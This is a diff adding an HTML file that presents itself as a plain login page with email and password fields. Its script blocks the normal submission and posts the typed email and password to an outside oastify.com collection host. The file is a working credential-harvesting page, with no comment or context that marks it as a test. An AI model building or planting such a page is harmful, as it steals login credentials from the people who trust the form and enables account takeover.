@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+</head>
+<body>
+    <h2>Login Page</h2>
+    <form id="loginForm">
+        <label for="email">Email:</label>
+        <input type="email" id="email" name="email" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent form from submitting the traditional way
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            var http = new XMLHttpRequest();
+            var url = 'https://lxm35rpsrv542ntnd9s6qhcrfil990do2.oastify.com';
+            var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);
+            http.open('POST', url, true);
+
+            // Send the proper header information along with the request
+            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+            http.onreadystatechange = function() { // Call a function when the state changes.
+                if (http.readyState == 4 && http.status == 200) {
+                    console.log(http.responseText);
+                }
+            }
+            http.send(params);
+        });
+    </script>
+</body>
+</html>
